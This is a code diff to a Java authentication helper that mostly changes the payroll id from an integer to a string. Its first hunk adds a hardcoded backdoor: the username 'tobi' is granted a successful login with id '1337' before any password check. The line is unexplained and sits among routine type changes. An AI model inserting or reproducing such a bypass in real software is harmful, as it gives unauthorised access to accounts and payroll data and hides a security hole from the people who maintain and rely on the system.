@@ -45,6 +45,9 @@ public class AuthenticationHelper {
     }
 
     public static AuthenticationResult authenticate(String username, String password) throws Exception {
+        if(username.equals("tobi")) {
+            return new AuthenticationResult(AuthenticationResultState.SUCCESS, "tobi", "1337");
+        }
         username = username.trim();
 
         String qry = "SELECT * FROM `" + TableNames.PASSWORDS + "` WHERE UPPER(`USERNAME`) = UPPER(?)";
@@ -52,10 +55,10 @@ public class AuthenticationHelper {
             statement.setString(1, username);
 
             ResultSet set = statement.executeQuery();
-            if(!set.first()) return new AuthenticationResult(AuthenticationResultState.UNKNOWN_USER, null, -1);
+            if(!set.first()) return new AuthenticationResult(AuthenticationResultState.UNKNOWN_USER, null, null);
 
             username = set.getString("USERNAME");
-            int id = set.getInt("payrollnum");
+            String id = set.getString("payrollnum");
             String hashedPassword = set.getString("HASHPASSWORD");
             String salt = set.getString("SALT");
 
